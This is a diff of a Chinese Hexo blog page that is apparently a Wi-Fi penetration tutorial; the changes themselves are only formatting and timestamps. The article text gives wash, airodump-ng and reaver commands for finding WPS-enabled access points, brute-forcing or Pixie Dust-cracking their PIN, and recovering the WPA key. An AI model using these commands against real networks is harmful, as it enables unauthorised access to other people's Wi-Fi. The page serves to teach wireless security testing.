@@ -30,7 +30,7 @@
 <meta property="og:description" content="该文章暂无概述">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2022-06-02T09:13:00.000Z">
-<meta property="article:modified_time" content="2023-12-12T03:19:24.112Z">
+<meta property="article:modified_time" content="2023-12-17T08:39:38.769Z">
 <meta property="article:author" content="Ghost">
 <meta property="article:tag" content="wifi 渗透">
 <meta name="twitter:card" content="summary">
@@ -244,7 +244,7 @@ SETUP)基本介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-12-12 11:19:24" itemprop="dateModified" datetime="2023-12-12T11:19:24+08:00">2023-12-12</time>
+      <time title="修改时间：2023-12-17 16:39:38" itemprop="dateModified" datetime="2023-12-17T16:39:38+08:00">2023-12-17</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -267,7 +267,7 @@ SETUP)基本介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>804</span>
+      <span>809</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
@@ -316,26 +316,24 @@ class="uri">https://www.cnblogs.com/qiyeboy/p/5825525.html</a></strong></p>
 <h3
 id="启动侦听模式后发现支持wps的ap">1、启动侦听模式后，发现支持WPS的AP</h3>
 <p><strong>（1）方法一</strong></p>
-<pre><code>wash -F -i wlan0mon</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wash -F -i wlan0mon</span><br></pre></td></tr></table></figure>
 <p><strong>注，-F忽略错误信息</strong></p>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220602162955739-1665396995.png" /></p>
 <p><strong>wash 命令</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># wash -h                   </span></span><br><span class="line"></span><br><span class="line">Wash v1.6.6 WiFi Protected Setup Scan Tool</span><br><span class="line">Copyright (c) 2011, Tactical Network Solutions, Craig Heffner</span><br><span class="line"></span><br><span class="line">Required Arguments:</span><br><span class="line">        -i, --interface=&lt;iface&gt;              Interface to capture packets on</span><br><span class="line">        -f, --file [FILE1 FILE2 FILE3 ...]   Read packets from capture files</span><br><span class="line"></span><br><span class="line">Optional Arguments:</span><br><span class="line">        -c, --channel=&lt;num&gt;                  Channel to listen on [auto]</span><br><span class="line">        -n, --probes=&lt;num&gt;                   Maximum number of probes to send to each AP <span class="keyword">in</span> scan mode [15]</span><br><span class="line">        -O, --output-file=&lt;filename&gt;         Write packets of interest into pcap file</span><br><span class="line">        -F, --ignore-fcs                     Ignore frame checksum errors</span><br><span class="line">        -2, --2ghz                           Use 2.4GHz 802.11 channels</span><br><span class="line">        -5, --5ghz                           Use 5GHz 802.11 channels</span><br><span class="line">        -s, --scan                           Use scan mode</span><br><span class="line">        -u, --survey                         Use survey mode [default]</span><br><span class="line">        -a, --all                            Show all APs, even those without WPS</span><br><span class="line">        -j, --json                           <span class="built_in">print</span> extended WPS info as json</span><br><span class="line">        -U, --utf8                           Show UTF8 ESSID (does not sanitize ESSID, dangerous)</span><br><span class="line">        -p, --progress                       Show percentage of crack progress</span><br><span class="line">        -h, --<span class="built_in">help</span>                           Show <span class="built_in">help</span></span><br><span class="line"></span><br><span class="line">Example:</span><br><span class="line">        wash -i wlan0mon</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># wash -h                   </span></span><br><span class="line"></span><br><span class="line">Wash v1.6.6 WiFi Protected Setup Scan Tool</span><br><span class="line">Copyright (c) 2011, Tactical Network Solutions, Craig Heffner</span><br><span class="line"></span><br><span class="line">Required Arguments:</span><br><span class="line">        -i, --interface=&lt;iface&gt;              Interface to capture packets on</span><br><span class="line">        -f, --file [FILE1 FILE2 FILE3 ...]   Read packets from capture files</span><br><span class="line"></span><br><span class="line">Optional Arguments:</span><br><span class="line">        -c, --channel=&lt;num&gt;                  Channel to listen on [auto]</span><br><span class="line">        -n, --probes=&lt;num&gt;                   Maximum number of probes to send to each AP <span class="keyword">in</span> scan mode [15]</span><br><span class="line">        -O, --output-file=&lt;filename&gt;         Write packets of interest into pcap file</span><br><span class="line">        -F, --ignore-fcs                     Ignore frame checksum errors</span><br><span class="line">        -2, --2ghz                           Use 2.4GHz 802.11 channels</span><br><span class="line">        -5, --5ghz                           Use 5GHz 802.11 channels</span><br><span class="line">        -s, --scan                           Use scan mode</span><br><span class="line">        -u, --survey                         Use survey mode [default]</span><br><span class="line">        -a, --all                            Show all APs, even those without WPS</span><br><span class="line">        -j, --json                           <span class="built_in">print</span> extended WPS info as json</span><br><span class="line">        -U, --utf8                           Show UTF8 ESSID (does not sanitize ESSID, dangerous)</span><br><span class="line">        -p, --progress                       Show percentage of crack progress</span><br><span class="line">        -h, --<span class="built_in">help</span>                           Show <span class="built_in">help</span></span><br><span class="line"></span><br><span class="line">Example:</span><br><span class="line">        wash -i wlan0mon</span><br></pre></td></tr></table></figure>
 <p><strong>（2）方法二</strong></p>
-<pre><code>airodump-ng wlan0mon --wps</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng wlan0mon --wps</span><br></pre></td></tr></table></figure>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220602163614875-1786105841.png" /></p>
 <h3 id="爆破pin码">2、爆破PIN码</h3>
 <p><strong>（1）方法一：直接爆破</strong></p>
-<pre><code>reaver -i wlan0mon -b &lt;AP mac&gt; -vv</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reaver -i wlan0mon -b &lt;AP mac&gt; -vv</span><br></pre></td></tr></table></figure>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220602163400155-1388000768.png" /></p>
 <p><strong>（2）方法二：利用漏洞获取</strong></p>
-<pre><code>reaver -i wlan0mon -b &lt;AP mac&gt; -vv -K 1</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reaver -i wlan0mon -b &lt;AP mac&gt; -vv -K 1</span><br></pre></td></tr></table></figure>
 <p><strong>注，reaver破解PIN码时，使用 -K 1
-调用命令pixiewps测试AP是否存在漏洞，存在则依据漏洞获取，否则爆破。也可以单独使用
-</strong>pixiewps命令测试，该方法**
-只适用于固定厂商的芯片，成功率很低**</p>
+调用命令pixiewps测试AP是否存在漏洞，存在则依据漏洞获取，否则爆破。也可以单独使用pixiewps命令测试，该方法只适用于固定厂商的芯片，成功率很低</strong></p>
 <h3 id="获取-psk">3、获取 PSK</h3>
-<pre><code>reaver -i wlan0mon -b &lt;AP mac&gt; -vv -p 88888888</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reaver -i wlan0mon -b &lt;AP mac&gt; -vv -p 88888888</span><br></pre></td></tr></table></figure>
 <p><strong>注，-p 指定PIN</strong></p>
 <h3 id="可能存在的问题">4、可能存在的问题</h3>
 <ul>
@@ -426,7 +424,7 @@ id="综合自动化无线密码破解工具wifite">5、综合自动化无线密�
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">10:14</span>
+    <span title="站点阅读时长">10:15</span>
   </span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
